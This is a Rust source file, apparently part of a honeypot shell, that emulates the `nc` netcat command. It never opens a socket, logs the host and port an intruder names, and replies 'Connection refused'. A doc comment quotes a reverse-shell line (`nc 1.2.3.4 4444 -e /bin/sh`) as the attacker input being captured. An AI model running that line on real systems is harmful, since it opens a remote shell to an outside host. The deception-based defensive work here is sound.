use super::capture_connection;
use crate::commands::CommandResult;
use crate::shell::{Screen, Shell};

const VALUE_FLAGS: [&str; 11] = [
    "-w", "-e", "-c", "-s", "-X", "-x", "-i", "-q", "-O", "-P", "-T",
];
const BUNDLED_VALUE_LETTERS: [char; 7] = ['w', 'e', 'c', 's', 'i', 'p', 'q'];

#[derive(Default)]
struct NcOptions {
    listen: bool,
    port_flag: bool,
    verbose: bool,
    scan: bool,
    udp: bool,
    operands: Vec<String>,
}

/// `nc [-lvnz] [-w SECS] [-e CMD] HOST PORT...`
///
/// No socket is ever opened — the same rule `wget` and `curl` follow. The
/// endpoint is captured, because `nc 1.2.3.4 4444 -e /bin/sh` names the C2 the
/// operator most wants out of a session, and then the connect fails.
///
/// "Connection refused" is the honest answer: it is by far the most common real
/// outcome (the attacker's listener is usually already gone), it is instant, and
/// it keeps them trying other tools rather than believing they have a shell.
pub fn nc(shell: &mut Shell, args: &[String]) -> CommandResult {
    let options = parse_args(args);
    if options.listen {
        listen(shell, &options)
    } else {
        connect(shell, options)
    }
}

fn parse_args(args: &[String]) -> NcOptions {
    let mut options = NcOptions::default();
    let mut iter = args.iter();

    while let Some(arg) = iter.next() {
        match arg.as_str() {
            // Flags that take a value, consumed so the value is not read as a
            // host or a port.
            s if VALUE_FLAGS.contains(&s) => {
                iter.next();
            }
            s if s.starts_with('-') && s.len() > 1 && !s.starts_with("--") => {
                let letters = &s[1..];
                for c in letters.chars() {
                    options.set_letter(c);
                }
                // A bundled value-taking flag consumes the next argument too,
                // as in `nc -lvp 4444` or `nc -w 3 host port`.
                if letters.ends_with(BUNDLED_VALUE_LETTERS) {
                    let value = iter.next();
                    if letters.ends_with('p') {
                        options.operands.extend(value.cloned());
                    }
                }
            }
            other => options.operands.push(other.to_string()),
        }
    }
    options
}

impl NcOptions {
    fn set_letter(&mut self, letter: char) {
        match letter {
            'l' => self.listen = true,
            'p' => self.port_flag = true,
            'v' => self.verbose = true,
            'z' => self.scan = true,
            'u' => self.udp = true,
            _ => {}
        }
    }
}

fn listen(shell: &mut Shell, options: &NcOptions) -> CommandResult {
    // Debian 12 ships netcat-openbsd, which really does refuse this — and
    // `nc -lvp PORT` is the syntax attackers type, carried over from
    // netcat-traditional. Reproducing the refusal is both faithful and the
    // reason listen mode needs no further emulation here.
    if options.port_flag {
        return CommandResult::err("nc: cannot use -p and -l\n", 1);
    }
    // A real listener blocks in accept(2) until a client connects or it is
    // interrupted; since no socket is ever opened here, holding the
    // terminal until Ctrl-C is the whole of what is left to emulate. Only
    // on an interactive PTY — the same gate `top` uses — because a pipe or
    // a one-shot `exec` has no terminal to hold.
    if shell.interactive && shell.stdout_is_tty {
        shell.screen = Some(Screen::Listen);
    }
    CommandResult::empty()
}

fn connect(shell: &mut Shell, options: NcOptions) -> CommandResult {
    let proto = if options.udp { "udp" } else { "tcp" };
    let mut operands = options.operands.into_iter();
    let Some(host) = operands.next() else {
        return CommandResult::err(
            "usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]\n",
            1,
        );
    };
    let ports: Vec<String> = operands.collect();
    if ports.is_empty() {
        return CommandResult::err("nc: missing port number\n", 1);
    }

    let mut errs = String::new();
    for port in ports {
        capture_connection(shell, "nc", format!("{proto}://{host}:{port}"));
        // netcat-openbsd is silent on a failed connect unless asked; only
        // `-v`/`-z` print the diagnostic.
        if options.verbose || options.scan {
            errs.push_str(&format!(
                "nc: connect to {host} port {port} ({proto}) failed: Connection refused\n"
            ));
        }
    }
    CommandResult::err(errs, 1)
}
